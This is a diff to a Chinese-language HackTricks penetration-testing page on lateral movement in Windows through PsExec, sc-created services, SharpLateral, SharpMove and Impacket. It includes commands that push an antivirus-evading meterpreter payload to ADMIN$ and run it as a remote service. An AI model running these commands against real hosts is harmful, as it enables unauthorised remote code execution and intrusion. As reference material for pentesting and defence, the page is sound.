@@ -1,4 +1,4 @@
-# PsExec/Winexec/ScExec
+# PsExec/Winexec/ScExec/SMBExec
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -9,28 +9,41 @@
 1. **通过 SMB 复制服务二进制文件到 ADMIN$ 共享**。
 2. **在远程机器上创建服务**，指向该二进制文件。
 3. 服务被 **远程启动**。
-4. 退出时，服务被 **停止，二进制文件被删除**。
+4. 退出时，服务被 **停止，并删除二进制文件**。
 
 ### **手动执行 PsExec 的过程**
 
 假设有一个可执行有效载荷（使用 msfvenom 创建并使用 Veil 混淆以规避防病毒检测），名为 'met8888.exe'，代表一个 meterpreter reverse_http 有效载荷，采取以下步骤：
 
 - **复制二进制文件**：可执行文件从命令提示符复制到 ADMIN$ 共享，尽管它可以放置在文件系统的任何位置以保持隐蔽。
+- 除了复制二进制文件，还可以使用 LOLBAS 二进制文件，如 `powershell.exe` 或 `cmd.exe`，直接从参数执行命令。例如 `sc create [ServiceName] binPath= "cmd.exe /c [PayloadCommand]"`
 - **创建服务**：利用 Windows `sc` 命令，该命令允许远程查询、创建和删除 Windows 服务，创建一个名为 "meterpreter" 的服务，指向上传的二进制文件。
-- **启动服务**：最后一步是启动服务，这可能会导致 "超时" 错误，因为该二进制文件不是一个真正的服务二进制文件，未能返回预期的响应代码。此错误无关紧要，因为主要目标是执行该二进制文件。
+- **启动服务**：最后一步涉及启动服务，这可能会导致 "超时" 错误，因为该二进制文件不是一个真正的服务二进制文件，未能返回预期的响应代码。此错误无关紧要，因为主要目标是执行该二进制文件。
 
 观察 Metasploit 监听器将显示会话已成功启动。
 
 [了解更多关于 `sc` 命令的信息](https://technet.microsoft.com/en-us/library/bb490995.aspx)。
 
-在此查找更详细的步骤: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+在这里找到更详细的步骤: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
-**您还可以使用 Windows Sysinternals 二进制文件 PsExec.exe：**
+- 您还可以使用 **Windows Sysinternals 二进制文件 PsExec.exe**：
 
 ![](<../../images/image (928).png>)
 
-您还可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
+或通过 webddav 访问它：
+```bash
+\\live.sysinternals.com\tools\PsExec64.exe -accepteula
+```
+- 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
+- 你也可以使用 [**SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
+SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
+```
+- 你也可以使用 **Impacket的 `psexec` 和 `smbexec.py`**。
+
+
 {{#include ../../banners/hacktricks-training.md}}
